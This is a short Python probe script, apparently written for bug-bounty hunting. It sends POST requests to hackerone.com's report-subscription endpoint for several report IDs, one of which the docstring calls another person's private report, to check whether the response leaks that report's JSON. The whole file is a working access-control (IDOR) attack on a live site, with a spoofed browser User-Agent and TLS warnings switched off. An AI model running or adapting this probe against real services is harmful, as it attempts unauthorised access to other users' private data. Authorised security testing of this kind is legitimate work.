# -*- coding: utf-8 -*-
"""h1x47: POST /reports/{id}/subscription.json?subscribe=true 探测
假设:订阅端点响应含 report JSON;3732660(他人私有)vs 3992341(自己)对照"""
import sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36',
                  'X-Requested-With': 'XMLHttpRequest'})

for rid in ['3732660', '3992341', '2487889']:
    url = f'https://hackerone.com/reports/{rid}/subscription.json?subscribe=true'
    try:
        r = s.post(url, timeout=15, allow_redirects=False)
        ct = r.headers.get('content-type', '')[:40]
        body = r.text[:400].replace('\n', ' ')
        print(f'[{r.status_code}] {rid} ct={ct}\n  body={body}')
    except Exception as e:
        print(f'[ERR] {rid} {e}')
    print()
